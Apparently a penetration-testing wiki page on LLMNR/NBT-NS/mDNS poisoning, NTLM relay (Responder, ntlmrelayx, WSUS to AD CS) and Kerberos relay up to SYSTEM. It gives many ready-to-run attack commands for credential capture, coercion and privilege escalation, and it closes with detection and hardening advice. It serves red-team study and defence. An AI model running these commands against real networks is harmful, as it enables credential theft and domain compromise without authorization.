  \n## Network Protocols\n\n### Local Host Resolution Protocols\n\n- **LLMNR, NBT-NS, and mDNS**:\n  - Microsoft and other\
  \ operating systems use LLMNR and NBT-NS for local name resolution when DNS fails. Similarly, Apple and Linux systems use\
  \ mDNS.\n  - These protocols are susceptible to interception and spoofing due to their unauthenticated, broadcast nature\
  \ over UDP.\n  - [Responder](https://github.com/lgandx/Responder) and [Dementor](https://github.com/MatrixEditor/Dementor)\
  \ can be used to impersonate services by sending forged responses to hosts querying these protocols.\n  - Further information\
  \ on service impersonation using Responder can be found [here](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).\n\
  \n### Web Proxy Auto-Discovery Protocol (WPAD)\n\n- WPAD allows browsers to discover proxy settings automatically.\n- Discovery\
  \ is facilitated via DHCP, DNS, or fallback to LLMNR and NBT-NS if DNS fails.\n- Responder can automate WPAD attacks, directing\
  \ clients to malicious WPAD servers.\n\n### Responder/Dementor for Protocol Poisoning\n\n- **Responder** is a tool used\
  \ for poisoning LLMNR, NBT-NS, and mDNS queries, selectively responding based on query types, primarily targeting SMB services.\n\
  - It comes pre-installed in Kali Linux, configurable at `/etc/responder/Responder.conf`.\n- Responder displays captured\
  \ hashes on the screen and saves them in the `/usr/share/responder/logs` directory.\n- It supports both IPv4 and IPv6.\n\
  - Windows version of Responder is available [here](https://github.com/lgandx/Responder-Windows).\n\n- **Dementor** expands\
  \ on the topics of multicast poisoning and additionally acts as a rogue service provider (including CUPS RCE support)\n\
  - Overall structure is similar to **Responder** with more granular configuration. (default is here: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))\n\
  - Compatibility between **Dementor** and **Responder** is given here: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)\n\
  - Intro and Documentation here: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)\n- Fixes capture issues\
  \ introduced by Responder on certain protocols\n\n#### Running Responder\n\n- To run Responder with default settings: `responder\
  \ -I <Interface>`\n- For more aggressive probing (with potential side effects): `responder -I <Interface> -P -r -v`\n- Techniques\
  \ to capture NTLMv1 challenges/responses for easier cracking: `responder -I <Interface> --lm --disable-ess`\n- WPAD impersonation\
  \ can be activated with: `responder -I <Interface> --wpad`\n- NetBIOS requests can be resolved to the attacker's IP, and\
  \ an authentication proxy can be set up: `responder.py -I <interface> -Pv`\n\n#### Running Dementor\n\n- With detault settings\
  \ applied: `Dementor -I <interface>`\n- With default settings in analysis mode: `Dementor -I <interface> -A`\n- Automatic\
  \ NTLM session downgrade (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`\n- Run current session with\
  \ custom config: `Dementor -I <interface> --config <file.toml>`\n\n### DHCP Poisoning with Responder\n\n- Spoofing DHCP\
  \ responses can permanently poison a victim's routing information, offering a stealthier alternative to ARP poisoning.\n\
  - It requires precise knowledge of the target network's configuration.\n- Running the attack: `./Responder.py -I eth0 -Pdv`\n\
  - This method can effectively capture NTLMv1/2 hashes, but it requires careful handling to avoid network disruption.\n\n\
  ### Capturing Credentials with Responder/Dementor\n\n- Responder/Dementor will impersonate services using the above-mentioned\
  \ protocols, capturing credentials (usually NTLMv2 Challenge/Response) when a user attempts to authenticate against the\
  \ spoofed services.\n- Attempts can be made to downgrade to NetNTLMv1 or disable ESS for easier credential cracking.\n\n\
  If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting\
  \ UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication\
  \ with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).\n\
  \nIt's crucial to note that employing these techniques should be done legally and ethically, ensuring proper authorization\
  \ and avoiding disruption or unauthorized access.\n\n## Inveigh\n\nInveigh is a tool for penetration testers and red teamers,\
  \ designed for Windows systems. It offers functionalities similar to Responder, performing spoofing and man-in-the-middle\
  \ attacks. The tool has evolved from a PowerShell script to a C# binary, with [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh)\
  \ and [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) as the main versions. Detailed parameters and instructions\
  \ can be found in the [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).\n\nInveigh can be operated\
  \ through PowerShell:\n\n```bash\nInvoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y\n```\n\nOr executed as a C# binary:\n\
  \n```bash\nInveigh.exe\n```\n\n### NTLM Relay Attack\n\nThis attack leverages SMB authentication sessions to access a target\
  \ machine, granting a system shell if successful. Key prerequisites include:\n\n- The authenticating user must have Local\
  \ Admin access on the relayed host.\n- SMB signing should be disabled.\n\n#### 445 Port Forwarding and Tunneling\n\nIn scenarios\
  \ where direct network introduction isn't feasible, traffic on port 445 needs to be forwarded and tunneled. Tools like [**PortBender**](https://github.com/praetorian-inc/PortBender)\
  \ help in redirecting port 445 traffic to another port, which is essential when local admin access is available for driver\
  \ loading.\n\nPortBender setup and operation in Cobalt Strike:\n\n```bash\nCobalt Strike -> Script Manager -> Load (Select\
  \ PortBender.cna)\n\nbeacon> cd C:\\Windows\\system32\\drivers # Navigate to drivers directory\nbeacon> upload C:\\PortBender\\\
  WinDivert64.sys # Upload driver\nbeacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445\nbeacon>\
  \ rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server\nbeacon> socks 1080 # Establish a SOCKS proxy\
  \ on port 1080\n\n# Termination commands\nbeacon> jobs\nbeacon> jobkill 0\nbeacon> rportfwd stop 8445\nbeacon> socks stop\n\
  ```\n\n### Other Tools for NTLM Relay Attack\n\n- **Metasploit**: Set up with proxies, local and remote host details.\n\
  - **smbrelayx**: A Python script for relaying SMB sessions and executing commands or deploying backdoors.\n- **MultiRelay**:\
  \ A tool from the Responder suite to relay specific users or all users, execute commands, or dump hashes.\n\nEach tool can\
  \ be configured to operate through a SOCKS proxy if necessary, enabling attacks even with indirect network access.\n\n###\
  \ MultiRelay Operation\n\nMultiRelay is executed from the _**/usr/share/responder/tools**_ directory, targeting specific\
  \ IPs or users.\n\n```bash\npython MultiRelay.py -t <IP target> -u ALL # Relay all users\npython MultiRelay.py -t <IP target>\
  \ -u ALL -c whoami # Execute command\npython MultiRelay.py -t <IP target> -u ALL -d # Dump hashes\n\n# Proxychains for routing\
  \ traffic\n```\n\n### RelayKing – relayable target discovery and curated relay lists\n\nRelayKing is an NTLM relay **exposure\
  \ auditor** that maps where relays are viable and produces ready-to-use target lists for `ntlmrelayx.py -tf`. It checks\
  \ protocol hardening (SMB signing/channel binding; HTTP/HTTPS/MSSQL/LDAP/LDAPS EPA/CBT; RPC auth) and flags **coercion/reflection\
  \ helpers** (PetitPotam/PrinterBug/DFSCoerce, WebClient/WebDAV, NTLMv1, CVE-2025-33073 reflection).\n\n- Auth improves reliability\
  \ for HTTPS/LDAPS CBT and MSSQL EPA checks; SMB signing/signature level is probed unauthenticated.\n- Cross-protocol relay\
  \ pathing leverages confirmed Net-NTLMv1 (`--ntlmv1`/`--ntlmv1-all`) findings; severity ranking is provided per path.\n\
  - `--gen-relay-list <file>` writes a grep-friendly target list for `ntlmrelayx.py -tf <file>` to avoid trial-and-error.\n\
  - `--coerce-all` mass-triggers PetitPotam/DFSCoerce/PrinterBug against all targets; `--ntlmv1-all` (RemoteRegistry) and\
  \ `--audit` (domain-wide LDAP host pull) are **noisy** and generate many logons/remote accesses.\n- `--proto-portscan` speeds\
  \ scanning by skipping closed ports; `--krb-dc-only` helps when DCs block NTLM but other services still accept it.\n\nExample\
  \ sweeps:\n\n```bash\n# Authenticated audit across multiple protocols + generate relay list for ntlmrelayx\npython3 relayking.py\
  \ -u lowpriv -p 'P@ssw0rd!' -d lab.local --dc-ip 10.0.0.10 \\\n  --audit --protocols smb,ldap,ldaps,mssql,http,https --proto-portscan\
  \ --ntlmv1 \\\n  --threads 10 -vv -o plaintext,json --output-file relayking-scan --gen-relay-list relaytargets.txt\n\n#\
  \ Unauthenticated CIDR sweep for SMB/LDAP/HTTP relayability\npython3 relayking.py --null-auth --protocols smb,ldap,http\
  \ --proto-portscan -o plaintext 10.10.0.0/24\n```\n\nThese tools and techniques form a comprehensive set for conducting\
  \ NTLM Relay attacks in various network environments.\n\n### Abusing WSUS HTTP (8530) for NTLM Relay to LDAP/SMB/AD CS (ESC8)\n\
  \nWSUS clients authenticate to their update server using NTLM over HTTP (8530) or HTTPS (8531). When HTTP is enabled, periodic\
  \ client check-ins can be coerced or intercepted on the local segment and relayed with ntlmrelayx to LDAP/LDAPS/SMB or AD\
  \ CS HTTP endpoints (ESC8) without cracking any hashes. This blends into normal update traffic and frequently yields machine-account\
  \ authentications (HOST$).\n\nWhat to look for\n- GPO/registry configuration under HKLM\\SOFTWARE\\Policies\\Microsoft\\\
  Windows\\WindowsUpdate and ...\\WindowsUpdate\\AU:\n  - WUServer (e.g., http://wsus.domain.local:8530)\n  - WUStatusServer\
  \ (reporting URL)\n  - UseWUServer (1 = WSUS; 0 = Microsoft Update)\n  - DetectionFrequencyEnabled and DetectionFrequency\
  \ (hours)\n- WSUS SOAP endpoints used by clients over HTTP:\n  - /ClientWebService/client.asmx (approvals)\n  - /ReportingWebService/reportingwebservice.asmx\
  \ (status)\n- Default ports: 8530/tcp HTTP, 8531/tcp HTTPS\n\nReconnaissance\n- Unauthenticated\n  - Scan for listeners:\
  \ nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>\n  - Sniff HTTP WSUS traffic via L2 MITM and log active clients/endpoints\
  \ with wsusniff.py (HTTP only unless you can make clients trust your TLS cert).\n- Authenticated\n  - Parse SYSVOL GPOs\
  \ for WSUS keys with MANSPIDER + regpol (wsuspider.sh wrapper summarises WUServer/WUStatusServer/UseWUServer).\n  - Query\
  \ endpoints at scale from hosts (NetExec) or locally:\n    nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH=\"HKLM\\\
  \\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\" KEY=\"WUServer\"\n    reg query HKLM\\Software\\Policies\\\
  Microsoft\\Windows\\WindowsUpdate\n\nEnd-to-end HTTP relay steps\n1) Position for MITM (same L2) so a client resolves the\
  \ WSUS server to you (ARP/DNS poisoning, Bettercap, mitm6, etc.). Example with arpspoof:\n    arpspoof -i <iface> -t <wsus_client_ip>\
  \ <wsus_server_ip>\n\n2) Redirect port 8530 to your relay listener (optional, convenient):\n    iptables -t nat -A PREROUTING\
  \ -p tcp --dport 8530 -j REDIRECT --to-ports 8530\n    iptables -t nat -L PREROUTING --line-numbers\n\n3) Start ntlmrelayx\
  \ with the HTTP listener (requires Impacket support for HTTP listener; see PRs below):\n    ntlmrelayx.py -t ldap://<DC>\
  \ -smb2support -socks --keep-relaying --http-port 8530\n\n   Other common targets:\n   - Relay to SMB (if signing off) for\
  \ exec/dump: -t smb://<host>\n   - Relay to LDAPS for directory changes (e.g., RBCD): -t ldaps://<DC>\n   - Relay to AD\
  \ CS web enrollment (ESC8) to mint a cert and then authenticate via Schannel/PKINIT:\n        ntlmrelayx.py --http-port\
  \ 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server\n     For deeper AD CS abuse paths and tooling, see the\
  \ AD CS page:\n\n{{#ref}}\n../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md\n{{#endref}}\n\
  \n4) Trigger a client check-in or wait for schedule. From a client:\n    wuauclt.exe /detectnow\n   or use the Windows Update\
  \ UI (Check for updates).\n\n5) Use the authenticated SOCKS sessions (if -socks) or direct relay results for post-exploitation\
  \ (LDAP changes, SMB ops, or AD CS certificate issuance for later authentication).\n\nHTTPS constraint (8531)\n- Passive\
  \ interception of WSUS over HTTPS is ineffective unless clients trust your certificate. Without a trusted cert or other\
  \ TLS break, the NTLM handshake can’t be harvested/relayed from WSUS HTTPS traffic.\n\nNotes\n- WSUS was announced deprecated\
  \ but remains widely deployed; HTTP (8530) is still common in many environments.\n- Useful helpers: wsusniff.py (observe\
  \ HTTP WSUS check-ins), wsuspider.sh (enumerate WUServer/WUStatusServer from GPOs), NetExec reg-query at scale.\n- Impacket\
  \ restored HTTP listener support for ntlmrelayx in PR #2034 (originally added in PR #913).\n\n### Force NTLM Logins\n\n\
  In Windows you **may be able to force some privileged accounts to authenticate to arbitrary machines**. Read the following\
  \ page to learn how:\n\n\n{{#ref}}\n../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md\n\
  {{#endref}}\n\n## Kerberos Relay attack\n\nA **Kerberos relay attack** steals an **AP-REQ ticket** from one service and\
  \ re-uses it against a second service that shares the **same computer-account key** (because both SPNs sit on the same `$`\
  \ machine account). This works even though the SPNs’ **service classes differ** (e.g. `CIFS/` → `LDAP/`) because the *key*\
  \ that decrypts the ticket is the machine’s NT hash, not the SPN string itself and the SPN string is not part of the signature.\n\
  \nUnlike NTLM relay, the hop is limited to the *same host* but, if you target a protocol that lets you write to LDAP, you\
  \ can chain into **Resource-Based Constrained Delegation (RBCD)** or **AD CS enrollment** and pop **NT AUTHORITY\\SYSTEM**\
  \ in a single shot.\n\nFor detailed info about this attack check:\n\n- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)\n\
  - [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)\n\
  \n- 1. **Kerberos basics**\n\n| Token | Purpose | Relay relevance |\n|-------|---------|-----------------|\n| **TGT / AS-REQ\
  \ ↔ REP** | Proves the user to the KDC | untouched |\n| **Service ticket / TGS-REQ ↔ REP** | Bound to one **SPN**; encrypted\
  \ with the SPN owner’s key | interchangeable if SPNs share account |\n| **AP-REQ** | Client sends `TGS` to the service |\
  \ **what we steal & replay** |\n\n* Tickets are encrypted with the **password-derived key of the account that owns the SPN**.\n\
  * The **Authenticator** inside the AP-REQ has a 5-minute timestamp; replay inside that window is valid until the service\
  \ cache sees a duplicate.\n* Windows rarely checks if the SPN string in the ticket matches the service you hit, so a ticket\
  \ for `CIFS/HOST` normally decrypts fine on `LDAP/HOST`.\n\n- 2. **What must be true to relay Kerberos**\n\n1. **Shared\
  \ key:** source and target SPNs belong to the same computer account (default on Windows servers).\n2. **No channel protection:**\
  \ SMB/LDAP signing off and EPA off for HTTP/LDAPS.\n3. **You can intercept or coerce authentication:** LLMNR/NBNS poison,\
  \ DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, etc..\n4. **Ticket source not already used:** you\
  \ win the race before the real packet hits or block it entirely; otherwise the server’s replay cache fires Event 4649.\n\
  5. You need to somehow be able to perform a **MitM in the communication** maybe being part of the DNSAmins group to modify\
  \ the DNS of the domain or being able to change the HOST file of the victim.\n\n### Unicode-normalization Kerberos reflection\
  \ (2025-2026)\n\nSynacktiv documented a **new Kerberos coercion/relay primitive** that bypassed the first SMB reflection\
  \ mitigations by abusing **inconsistent Unicode normalization** across Windows DNS, Kerberos/SPN lookup, and SMB ticket\
  \ acceptance.\n\n- The attacker needs a way to **register AD-integrated DNS records** and **coerce machine authentication**\
  \ (`PetitPotam`, DFSCoerce, etc.).\n- The crafted target name must be:\n  - **Different enough** from the victim hostname/FQDN\
  \ that `DnsCache` does **not** treat it as \"self\", so a DNS query is emitted.\n  - **Equivalent enough** during DC-side\
  \ SPN lookup that the TGS request resolves to the **real machine account SPN**.\n- This was achieved by combining:\n  -\
  \ a **Unicode hostname lookalike** such as replacing `R` in `SRV1` with a Unicode equivalent so `CompareStringW(..., NORM_IGNORECASE)`\
  \ no longer returns equal on the client side\n  - **Unicode dot equivalents** in the FQDN so the DC-side SPN search key\
  \ still collides with the victim FQDN SPN set\n\nWhy it works:\n\n- `DnsCache` self-name checks use `CompareStringW` with\
  \ only **`NORM_IGNORECASE`**.\n- SPN lookups in AD ultimately depend on **ESE/NTDS search keys** derived from `LCMapStringEx(...,\
  \ 0x31403)` (`LCMAP_SORTKEY`, `NORM_IGNORECASE`, `NORM_IGNOREKANATYPE`, `NORM_IGNORENONSPACE`, `NORM_IGNOREWIDTH`, `SORT_STRINGSORT`).\n\
  - Therefore, two strings can be **different for client-side self-comparison** but still **collide during SPN lookup** on\
  \ the DC.\n- SMB then accepts the relayed AP-REQ as long as the service ticket decrypts under the same machine account key\
  \ and the local-auth checks are otherwise satisfied.\n\nPractical constraints and workflow:\n\n1. A pure hostname variant\
  \ tends to fail because **LDAP/DNS uniqueness checks** can hit the same normalized collision and reject the record as already\
  \ existing.\n2. The practical workaround is to register a **crafted FQDN** whose DNS label passes uniqueness checks but\
  \ whose **constructed SPN** still collides with the victim machine SPNs.\n3. Coerce the victim to authenticate to that crafted\
  \ name, receive the **Kerberos AP-REQ** on the relay box, and relay it to a service on the victim or another service bound\
  \ to the same machine account.\n4. Some relay tooling may need a **small patch** to stop enforcing strict ASCII/hostname\
  \ equality on the relayed target name because the ticket `sname` can contain Unicode.\n\nRepresentative chain:\n\n```bash\n\
  # 1. Register crafted ADIDNS record pointing to attacker\ndnstool.py -u 'DOMAIN\\\\user' -p 'Passw0rd!' -r '<unicode-fqdn>'\
  \ -d <attacker-ip> <dc>\n\n# 2. Coerce machine auth to the crafted name\nPetitPotam.py -u user -p 'Passw0rd!' '<unicode-fqdn>'\
  \ <victim-fqdn>\n\n# 3. Relay the Kerberos AP-REQ\nkrbrelayx.py -t smb://<victim-fqdn> -c whoami\n```\n\n### Kerberos Relay\
  \ Steps\n\n- 3.1 **Recon the host**\n\n```powershell\n# find servers where HTTP, LDAP or CIFS share the same machine account\n\
  Get-ADComputer -Filter * -Properties servicePrincipalName |\n  Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'}\
  \ |\n  Select Name,servicePrincipalName\n```\n\n- 3.2 **Start the relay listener**\n\n[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)\n\
  \n```powershell\n# one-click local SYSTEM via RBCD\n.\\KrbRelayUp.exe relay --spn \"ldap/DC01.lab.local\" --method rbcd\
  \ --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8\n```\n`KrbRelayUp` wraps **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass**\
  \ in one binary.\n\n- 3.3 **Coerce Kerberos auth**\n\n```powershell\n# coerce DC to auth over SMB with DFSCoerce\n.\\dfscoerce.exe\
  \ --target \\\\DC01.lab.local --listener 10.0.0.50\n```\nDFSCoerce makes the DC send a Kerberos `CIFS/DC01` ticket to us.\n\
  \n- 3.4 **Relay the AP-REQ**\n\nKrbRelay extracts the GSS blob from SMB, repackages it into an LDAP bind, and forwards it\
  \ to `ldap://DC01`—authentication succeeds because the **same key** decrypts it.\n\n- 3.5 **Abuse LDAP ➜ RBCD ➜ SYSTEM**\n\
  \n```powershell\n# (auto inside KrbRelayUp) manual for clarity\nNew-MachineAccount -Name \"FAKE01\" -Password \"P@ss123\"\
  \nKrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID\nRubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01\
  \ /ptt\nSCMUACBypass.exe\n```\nYou now own **NT AUTHORITY\\SYSTEM**.\n\n\n### **More paths worth knowing**\n\n| Vector |\
  \ Trick | Why it matters |\n|--------|-------|----------------|\n| **AuthIP / IPSec** | Fake server sends a **GSS-ID payload**\
  \ with any SPN; client builds an AP-REQ straight to you | Works even across subnets; machine creds by default |\n| **DCOM\
  \ / MSRPC** | Malicious OXID resolver forces client to auth to arbitrary SPN and port | Pure *local* priv-esc; sidesteps\
  \ firewall |\n| **AD CS Web Enroll** | Relay machine ticket to `HTTP/CA` and get a cert, then **PKINIT** to mint TGTs |\
  \ Bypasses LDAP signing defenses |\n| **Shadow Credentials** | Write `msDS-KeyCredentialLink`, then PKINIT with forged key\
  \ pair | No need to add a computer account |\n\n### **Troubleshooting**\n\n| Error | Meaning | Fix |\n|-------|---------|-----|\n\
  | `KRB_AP_ERR_MODIFIED` | Ticket key ≠ target key | Wrong host/SPN |\n| `KRB_AP_ERR_SKEW` | Clock > 5 min offset | Sync\
  \ time or use `w32tm` |\n| LDAP bind fails | Signing enforced | Use AD CS path or disable signing |\n| Event 4649 spam |\
  \ Service saw duplicate Authenticator | block or race original packet |\n\n\n### **Detection**\n\n* Surge in **Event 4769**\
  \ for `CIFS/`, `HTTP/`, `LDAP/` from the same source within seconds.\n* **Event 4649** on the service indicates replay detected.\n\
  * Kerberos logon from **127.0.0.1** (relay to local SCM) is highly suspicious—map via Sigma rule in KrbRelayUp docs.\n*\
  \ Watch changes to `msDS-AllowedToActOnBehalfOfOtherIdentity` or `msDS-KeyCredentialLink` attributes.\n\n## **Hardening**\n\
  \n1. **Enforce LDAP & SMB signing + EPA** on every server.\n2. **Split SPNs** so HTTP isn’t on the same account as CIFS/LDAP.\n\
  3. Patch coercion vectors (PetitPotam KB5005413, DFS, AuthIP).\n4. Set **`ms-DS-MachineAccountQuota = 0`** to stop rogue\
  \ computer joins.\n5. Alert on **Event 4649** and unexpected loopback Kerberos logons.\n\n\n\n## References\n\n- [HTB: Breach\
